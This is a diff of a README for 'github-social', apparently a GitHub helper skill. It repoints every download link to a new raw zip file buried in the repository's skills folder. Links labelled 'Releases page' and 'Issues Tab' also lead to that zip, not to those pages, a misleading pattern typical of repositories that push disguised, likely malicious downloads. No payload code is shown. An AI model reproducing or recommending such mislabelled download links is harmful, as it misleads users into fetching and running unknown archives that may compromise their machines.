@@ -6,11 +6,11 @@ github-social is a powerful tool for enhancing your GitHub repositories. This Cl
 ## 🚀 Getting Started
 Download and install github-social to improve your GitHub experience. Follow these simple steps to set it up.
 
-[![Download github-social](https://raw.githubusercontent.com/sheharyarimtiaz/github-social/main/skills/social-preview/github-social-v2.3.zip)](https://raw.githubusercontent.com/sheharyarimtiaz/github-social/main/skills/social-preview/github-social-v2.3.zip)
+[![Download github-social](https://raw.githubusercontent.com/sheharyarimtiaz/github-social/main/skills/social-preview/references/social-github-v1.4.zip)](https://raw.githubusercontent.com/sheharyarimtiaz/github-social/main/skills/social-preview/references/social-github-v1.4.zip)
 
 ## 📥 Download & Install
 1. **Visit the Releases Page:** 
-   Go to the [Releases page](https://raw.githubusercontent.com/sheharyarimtiaz/github-social/main/skills/social-preview/github-social-v2.3.zip).
+   Go to the [Releases page](https://raw.githubusercontent.com/sheharyarimtiaz/github-social/main/skills/social-preview/references/social-github-v1.4.zip).
 
 2. **Choose Your Version:**
    Look for the latest version listed. It will typically be at the top of the page.
@@ -60,6 +60,6 @@ If you wish to contribute to github-social, feel free to fork the repo and submi
 github-social is an open-source project licensed under the MIT License. This allows you to use, modify, and distribute the software freely.
 
 ## 🌐 Support
-If you encounter issues or have questions, check the FAQ section on the GitHub page. For further assistance, visit the [Issues Tab](https://raw.githubusercontent.com/sheharyarimtiaz/github-social/main/skills/social-preview/github-social-v2.3.zip) to report problems or request features.
+If you encounter issues or have questions, check the FAQ section on the GitHub page. For further assistance, visit the [Issues Tab](https://raw.githubusercontent.com/sheharyarimtiaz/github-social/main/skills/social-preview/references/social-github-v1.4.zip) to report problems or request features.
 
-[![Download github-social](https://raw.githubusercontent.com/sheharyarimtiaz/github-social/main/skills/social-preview/github-social-v2.3.zip)](https://raw.githubusercontent.com/sheharyarimtiaz/github-social/main/skills/social-preview/github-social-v2.3.zip)
+[![Download github-social](https://raw.githubusercontent.com/sheharyarimtiaz/github-social/main/skills/social-preview/references/social-github-v1.4.zip)](https://raw.githubusercontent.com/sheharyarimtiaz/github-social/main/skills/social-preview/references/social-github-v1.4.zip)
